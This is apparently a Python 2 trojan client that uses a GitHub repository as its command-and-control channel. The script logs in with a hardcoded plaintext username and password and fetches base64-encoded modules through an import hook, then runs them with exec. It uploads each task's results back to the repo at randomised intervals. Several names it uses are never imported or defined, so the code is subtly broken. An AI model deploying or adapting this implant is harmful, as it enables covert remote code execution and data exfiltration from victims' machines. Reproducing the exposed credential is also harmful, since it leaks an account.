#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
from github import Github
from base64 import b64encode, b64decode
from json import loads
from time import sleep


client_id       = "AngryEggplant"
client_config   = "%s.json" % client_id
data_path       = "data/%s/" % client_id
client_modules  = []
configured      = False

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
        
    def find_module(self,fullname,path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)
            
            if new_library is not None:
                self.current_module_code = b64decode(new_library)
                return self      
        return None

    def load_module(self,name):
        module = new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module

def threader():
    while True:
        worker = task_queue.get()
        module_runner(worker)


def connect_to_github():
    gh = Github("colental","Vega6812!")
    repo = gh.get_user().get_repo("AngryEggplant")
    branch = repo.get_branch("master")    
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    for filename in repo.get_contents('.'):
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def load_json(json):
    return loads(json)

def get_client_config():
    global configured
    config_json   = get_file_contents(client_config)
    config        = load_json(b64decode(config_json))
    configured    = True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (client_id,randint(1000,100000))
    repo.create_file(remote_path,"Commit message",b64encode(data))
    return

def module_runner(module):
    result = sys.modules[module].run()
    store_module_result(result)
    task_queue.task_done()
    return

def main():
    while True:    
        if task_queue.empty():
            config = get_client_config()
            for task in config:
                task_queue.put(1)
                t = Thread(target=module_runner,args=(task['module'],))
                t.start()
                sleep(randint(1,10))
        sleep(randint(1000,10000))
            
if __name__ == '__main__':
    main()
